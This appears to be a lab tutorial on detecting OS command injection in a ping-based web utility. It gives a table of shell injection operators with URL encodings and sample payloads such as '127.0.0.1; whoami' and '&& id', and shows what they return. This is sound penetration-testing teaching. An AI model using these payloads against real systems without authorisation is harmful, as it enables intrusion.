# Command Injection Detection

> **🔍 Discovery Techniques:** Methods to detect and identify OS command injection vulnerabilities in web applications

## Overview

The process of detecting basic OS Command Injection vulnerabilities is the same process for exploiting such vulnerabilities. We attempt to append our command through various injection methods. If the command output changes from the intended usual result, we have successfully exploited the vulnerability.

This may not be true for more advanced command injection vulnerabilities because we may utilize various fuzzing methods or code reviews to identify potential command injection vulnerabilities. We may then gradually build our payload until we achieve command injection.

**Focus:** This module focuses on basic command injections, where we control user input that is being directly used in a system command execution function without any sanitization.

---

## Command Injection Detection

### Target Analysis Example

**Scenario:** Host Checker utility that asks for an IP to check whether it is alive or not.

**Initial Test:**
```bash
# Input: 127.0.0.1
# Expected functionality: ping command
```

**Expected Backend Command:**
```bash
ping -c 1 OUR_INPUT
```

**Analysis:** If our input is not sanitized and escaped before it is used with the ping command, we may be able to inject another arbitrary command.

### Detection Strategy

**Goal:** Determine if the web application is vulnerable to OS command injection by:

1. **Identifying input points** that may be processed by system commands
2. **Testing injection operators** to see if additional commands execute
3. **Analyzing response changes** to confirm successful injection
4. **Mapping application behavior** to understand the underlying command structure

---

## Command Injection Methods

### Injection Operators Reference

| **Injection Operator** | **Character** | **URL-Encoded** | **Execution Behavior** | **Use Case** |
|------------------------|---------------|-----------------|------------------------|--------------|
| **Semicolon** | `;` | `%3b` | Both commands execute | Command separation |
| **New Line** | `\n` | `%0a` | Both commands execute | Line termination |
| **Background** | `&` | `%26` | Both execute (second output usually shown first) | Parallel execution |
| **Pipe** | `\|` | `%7c` | Both execute (only second output shown) | Output redirection |
| **AND** | `&&` | `%26%26` | Both execute (only if first succeeds) | Conditional execution |
| **OR** | `\|\|` | `%7c%7c` | Second executes (only if first fails) | Error handling |
| **Sub-Shell** | `` ` `` | `%60%60` | Both execute (Linux-only) | Command substitution |
| **Sub-Shell** | `$()` | `%24%28%29` | Both execute (Linux-only) | Modern command substitution |

### Operator Details

**1. Semicolon (`;`)**
```bash
# Example payload
127.0.0.1; whoami

# Resulting command
ping -c 1 127.0.0.1; whoami
```
- **Usage:** Command separator - executes commands sequentially
- **Compatibility:** Works on Linux/Unix and PowerShell, may not work on Windows CMD

**2. New Line (`\n`)**
```bash
# Example payload (URL-encoded)
127.0.0.1%0awhoami

# Resulting command
ping -c 1 127.0.0.1
whoami
```
- **Usage:** Creates new command line
- **Compatibility:** Universal across all platforms

**3. Background (`&`)**
```bash
# Example payload
127.0.0.1 & whoami

# Resulting command
ping -c 1 127.0.0.1 & whoami
```
- **Usage:** Runs first command in background, executes second immediately
- **Note:** Second command output often appears first

**4. Pipe (`|`)**
```bash
# Example payload
127.0.0.1 | whoami

# Resulting command
ping -c 1 127.0.0.1 | whoami
```
- **Usage:** Pipes output of first command to second
- **Result:** Only second command output is typically shown

**5. AND (`&&`)**
```bash
# Example payload
127.0.0.1 && whoami

# Resulting command
ping -c 1 127.0.0.1 && whoami
```
- **Usage:** Executes second command only if first succeeds (exit code 0)
- **Advantage:** Ensures first command completes successfully

**6. OR (`||`)**
```bash
# Example payload
invalid_ip || whoami

# Resulting command
ping -c 1 invalid_ip || whoami
```
- **Usage:** Executes second command only if first fails (non-zero exit code)
- **Use Case:** Exploit error conditions

**7. Sub-Shell Backticks (`` ` ``)**
```bash
# Example payload
127.0.0.1; `whoami`

# Resulting command
ping -c 1 127.0.0.1; `whoami`
```
- **Usage:** Command substitution - executes command and returns output
- **Limitation:** Linux/Unix only

**8. Sub-Shell Modern (`$()`)**
```bash
# Example payload
127.0.0.1; $(whoami)

# Resulting command
ping -c 1 127.0.0.1; $(whoami)
```
- **Usage:** Modern command substitution syntax
- **Limitation:** Linux/Unix only

---

## Platform Compatibility

### Universal Operators
These work across **all platforms** (Linux, Windows, macOS):
- `;` (except Windows CMD)
- `\n` 
- `&`
- `|`
- `&&`
- `||`

### Unix-Only Operators
These work on **Linux and macOS only**:
- `` ` `` (backticks)
- `$()` (sub-shell)

### Platform-Specific Notes

**Windows CMD Limitations:**
```cmd
REM Semicolon may not work in CMD
ping -c 1 127.0.0.1; whoami  # May fail

REM Use && or || instead
ping -c 1 127.0.0.1 && whoami  # Works
```

**PowerShell Compatibility:**
```powershell
# All operators work in PowerShell
ping -c 1 127.0.0.1; whoami  # Works
ping -c 1 127.0.0.1 && whoami  # Works
```

**Linux/Unix Full Support:**
```bash
# All operators supported
ping -c 1 127.0.0.1; whoami     # Works
ping -c 1 127.0.0.1 && whoami   # Works  
ping -c 1 127.0.0.1 | whoami    # Works
ping -c 1 127.0.0.1 `whoami`    # Works
ping -c 1 127.0.0.1 $(whoami)   # Works
```

---

## Detection Methodology

### Step 1: Identify Input Points

**Common Vulnerable Parameters:**
- IP address fields
- Filename inputs
- System utilities (ping, nslookup, traceroute)
- File processing functions
- Search functionality
- Configuration settings

### Step 2: Test Basic Injection

**Simple Test Payloads:**
```bash
# Test with semicolon
original_input; whoami

# Test with AND operator  
original_input && whoami

# Test with pipe
original_input | whoami
```

### Step 3: Analyze Response Changes

**Positive Indicators:**
- Additional command output appears
- Error messages change
- Response timing differences
- Different HTTP status codes

**Example Response Analysis:**
```bash
# Normal ping response
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss

# Injected command response
PING 127.0.0.1 (127.0.0.1): 56 data bytes  
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
www-data
```

### Step 4: Confirm Injection

**Verification Commands:**
```bash
# System information
whoami
id
hostname
pwd

# Directory listing
ls
dir

# System details
uname -a
systeminfo
```

---

## Detection Tips

### Best Practices

**1. Start Simple:**
```bash
# Begin with basic operators
target_input; whoami
target_input && id
```

**2. Use Safe Commands:**
```bash
# Non-destructive verification
whoami
hostname  
pwd
echo "injection_successful"
```

**3. Test Multiple Operators:**
```bash
# Try different injection methods
input; cmd
input && cmd  
input || cmd
input | cmd
input & cmd
```

**4. URL Encoding:**
```bash
# Remember to URL-encode for web requests
%3b for ;
%26%26 for &&
%7c for |
```

### Common Pitfalls

**❌ Avoid These Mistakes:**
- Don't use destructive commands during detection
- Don't ignore URL encoding requirements
- Don't test only one injection operator
- Don't forget platform-specific limitations

**✅ Best Practices:**
- Use harmless verification commands
- Test multiple injection methods
- Consider the target platform
- Document successful injection vectors

---

## Practical Example

### Host Checker Exploitation

**Target:** IP address input field in ping utility

**Detection Process:**

**1. Normal Input:**
```bash
Input: 127.0.0.1
Output: PING 127.0.0.1 ... (normal ping response)
```

**2. Injection Test:**
```bash
Input: 127.0.0.1; whoami
Output: PING 127.0.0.1 ... (ping response)
        www-data (injection successful!)
```

**3. Verification:**
```bash
Input: 127.0.0.1 && id
Output: PING 127.0.0.1 ... (ping response)
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**4. System Enumeration:**
```bash
Input: 127.0.0.1; uname -a
Output: PING 127.0.0.1 ... (ping response)
        Linux target 5.4.0-74-generic #83-Ubuntu SMP
```

This methodical approach ensures reliable detection of command injection vulnerabilities while maintaining operational security.

---

## Lab Exercise

### HTB Academy Challenge

**Target:** Host Checker utility at provided IP:PORT

**Task:** Try adding injection operators after the IP in the input field

**Detection Question:** What did the error message say when using injection operators?

**Testing Approach:**
1. Try each injection operator systematically
2. Note any error messages or changed responses  
3. Document which operators trigger different behavior
4. Identify successful injection indicators

**Expected Workflow:**
```bash
# Test basic injection operators
127.0.0.1; whoami
127.0.0.1 && whoami  
127.0.0.1 || whoami
127.0.0.1 | whoami
127.0.0.1 & whoami
```

**Success Indicators:**
- Additional command output appears
- Error messages mention injected commands
- Response structure changes
- Different timing in responses

Remember: The goal is to confirm whether the application is vulnerable to command injection through systematic testing of injection operators. 